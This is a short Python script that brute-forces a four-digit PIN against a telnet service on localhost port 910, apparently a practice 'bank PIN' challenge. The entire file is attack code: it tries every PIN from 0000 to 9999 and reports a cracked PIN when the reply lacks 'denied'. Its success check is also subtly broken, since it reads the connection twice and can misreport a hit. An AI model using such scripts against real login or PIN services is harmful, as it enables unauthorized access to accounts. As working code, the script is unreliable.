#coding:utf-8

import sys
import socket
import telnetlib
import random

def BANK_PIN():
	'''
		This function is used to find
		the PIN code of the program __BANK_PIN__().
	'''

	# I generate a list of 0000 to 10000 for bruteforce.
	# output for connect.

	for pin_connect in range(0000, 10000):
		'''
			Creating a loop, only for pin.
			We range from 0000 to 10000.
		'''
		telnet_connect   = telnetlib.Telnet("127.0.0.1", 910)
		telnet_connect.read_until("[$] ")

		if(len(str(pin_connect)) == 1):
			telnet_connect.write("000" + str(pin_connect) + "\n")
			pin_code = "000" + str(pin_connect)

		elif(len(str(pin_connect)) == 2):
			telnet_connect.write("00" + str(pin_connect) + "\n")
			pin_code = "00" + str(pin_connect)

		elif(len(str(pin_connect)) == 3):
			telnet_connect.write("0" + str(pin_connect) + "\n")
			pin_code = "0" + str(pin_connect)

		elif(len(str(pin_connect)) == 4):
			telnet_connect.write(str(pin_connect) + "\n")
			pin_code = str(pin_connect)

		# In this condition we test whether the password is correct or not.
		# function > __BANK_PIN__().

		if("denied" in telnet_connect.read_all()):
			print("[-] PIN NOT CRACKED : %s" %(pin_code))
		elif("denied" not in telnet_connect.read_all()):
			print("[+] PIN CRACKED : %s" %(pin_code))
			sys.exit(0)

if __name__ == "__main__":
	BANK_PIN()
